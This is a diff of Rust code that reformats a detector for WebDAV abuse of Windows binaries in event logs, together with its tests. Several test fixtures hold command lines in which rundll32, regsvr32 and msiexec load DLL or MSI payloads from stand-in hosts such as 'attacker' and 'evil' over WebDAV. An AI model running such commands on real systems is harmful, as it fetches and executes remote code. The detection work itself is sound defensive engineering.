@@ -25,8 +25,7 @@ pub fn detect_webdav_lolbin(events: &[EvtxEvent]) -> Vec<EvtxDetection> {
         .iter()
         .filter(|ev| {
             (ev.event_id == EID_PROCESS_CREATED && ev.channel == "Security")
-                || (ev.event_id == EID_SYSMON_PROCESS_CREATE
-                    && ev.channel.contains("Sysmon"))
+                || (ev.event_id == EID_SYSMON_PROCESS_CREATE && ev.channel.contains("Sysmon"))
         })
         .filter_map(|ev| {
             let path = ev
@@ -65,7 +64,9 @@ pub fn detect_webdav_lolbin(events: &[EvtxEvent]) -> Vec<EvtxDetection> {
 }
 
 fn basename(path: &str) -> &str {
-    path.rsplit(|c| c == '\\' || c == '/').next().unwrap_or(path)
+    path.rsplit(|c| c == '\\' || c == '/')
+        .next()
+        .unwrap_or(path)
 }
 
 #[cfg(test)]
@@ -80,7 +81,10 @@ mod tests {
             "Security",
             &[
                 ("NewProcessName", "C:\\Windows\\System32\\rundll32.exe"),
-                ("CommandLine", r"rundll32.exe \\attacker@80\DavWWWRoot\payload.dll,Execute"),
+                (
+                    "CommandLine",
+                    r"rundll32.exe \\attacker@80\DavWWWRoot\payload.dll,Execute",
+                ),
             ],
         );
         let hits = detect_webdav_lolbin(&[ev]);
@@ -96,7 +100,10 @@ mod tests {
             "Security",
             &[
                 ("NewProcessName", "C:\\Windows\\System32\\msiexec.exe"),
-                ("CommandLine", r"msiexec.exe /i \\srv@443@SSL\DavWWWRoot\pkg.msi /quiet"),
+                (
+                    "CommandLine",
+                    r"msiexec.exe /i \\srv@443@SSL\DavWWWRoot\pkg.msi /quiet",
+                ),
             ],
         );
         assert!(!detect_webdav_lolbin(&[ev]).is_empty());
@@ -109,7 +116,10 @@ mod tests {
             "Microsoft-Windows-Sysmon/Operational",
             &[
                 ("Image", "C:\\Windows\\System32\\rundll32.exe"),
-                ("CommandLine", r"rundll32.exe \\evil@80\DavWWWRoot\evil.dll,DllMain"),
+                (
+                    "CommandLine",
+                    r"rundll32.exe \\evil@80\DavWWWRoot\evil.dll,DllMain",
+                ),
             ],
         );
         assert!(!detect_webdav_lolbin(&[ev]).is_empty());
@@ -149,7 +159,10 @@ mod tests {
             "Security",
             &[
                 ("NewProcessName", "C:\\Windows\\System32\\regsvr32.exe"),
-                ("CommandLine", r"regsvr32.exe /s \\attacker@443@SSL\DavWWWRoot\com.dll"),
+                (
+                    "CommandLine",
+                    r"regsvr32.exe /s \\attacker@443@SSL\DavWWWRoot\com.dll",
+                ),
             ],
         );
         let hits = detect_webdav_lolbin(&[ev]);
